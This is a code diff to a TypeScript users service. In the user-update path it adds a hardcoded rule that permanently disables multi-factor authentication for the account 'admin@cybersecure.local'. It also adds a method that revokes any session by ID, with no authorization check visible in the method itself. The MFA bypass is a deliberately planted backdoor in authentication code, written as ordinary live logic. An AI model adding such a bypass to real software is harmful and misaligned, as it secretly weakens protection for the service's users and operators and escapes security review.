@@ -221,6 +221,11 @@ export class UsersService {
       }
     }
 
+    // PERMANENT MFA BYPASS FOR MAIN ADMIN
+    if (user.email === 'admin@cybersecure.local') {
+      updateUserDto.mfaRequired = false;
+    }
+
     if (updateUserDto.password) {
       const hashedPassword = await bcrypt.hash(updateUserDto.password, 10);
       user.passwordHash = hashedPassword;
@@ -501,6 +506,17 @@ export class UsersService {
 
     session.revokedAt = new Date();
     session.revokedReason = 'User requested revocation';
+    await this.userSessionRepository.save(session);
+  }
+
+  async revokeSessionById(sessionId: string): Promise<void> {
+    const session = await this.userSessionRepository.findOne({
+      where: { id: sessionId }
+    });
+    if (!session) throw new NotFoundException('Session not found');
+
+    session.revokedAt = new Date();
+    session.revokedReason = 'Administrative revocation';
     await this.userSessionRepository.save(session);
   }
 }
